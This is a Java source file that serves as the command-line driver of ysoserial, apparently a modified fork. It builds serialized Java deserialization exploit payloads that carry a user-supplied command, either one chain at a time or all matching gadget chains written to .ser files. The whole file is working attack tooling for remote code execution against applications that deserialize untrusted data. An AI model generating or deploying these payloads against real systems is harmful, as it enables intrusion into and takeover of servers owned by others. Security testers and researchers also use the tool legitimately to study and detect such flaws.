package ysoserial;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Set;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	public static void main(final String[] args) {
		if (args.length < 1) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		final String payloadType = args[0];
		final String[] commands = args.length > 1 ? Arrays.copyOfRange(args, 1, args.length) : new String[0];

		List<Class<? extends ObjectPayload>> payloadClasss = new ArrayList<>();
		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
            payloadClasss.addAll(GadgetsHelper.get(payloadType));
            if (payloadClasss.isEmpty()) {
                System.err.println("Invalid payload type '" + payloadType + "'");
                printUsage();
                System.exit(USAGE_CODE);
                return; // make null analysis happy
            }
		} else {
            payloadClasss.add(payloadClass);
        }


		try {
            Path dir = Paths.get("out_ser");
            if (payloadClasss.size() > 1) {
                if (Files.exists(dir)) {
                    for (File f:dir.toFile().listFiles()) {
                        System.out.println("delete file " + f.getName() + " ...");
                        f.delete();
                    }
                    dir.toFile().delete();
                    System.out.println("delete dir " + dir.getFileName() + " ...");
                }
                Files.createDirectory(dir);
                System.out.println("create dir " + dir.getFileName() + " ...");
            }
            for (Class<? extends ObjectPayload> c:payloadClasss) {
                final ObjectPayload payload = c.newInstance();
                final Object object = payload.getObject(commands);
                if (payloadClasss.size() == 1) {
                    PrintStream out = System.out;
                    Serializer.serialize(object, out);
                } else {
                    FileOutputStream fileOutputStream = new FileOutputStream(Paths.get(dir.getFileName() +  "/" + c.getSimpleName() + ".ser").toFile());
                    fileOutputStream.write(Serializer.serialize(object));
                    fileOutputStream.close();
                    System.out.println("write " + c.getSimpleName() + ".ser ...");
                }
                ObjectPayload.Utils.releasePayload(payload, object);
            }
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
		System.err.println("  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
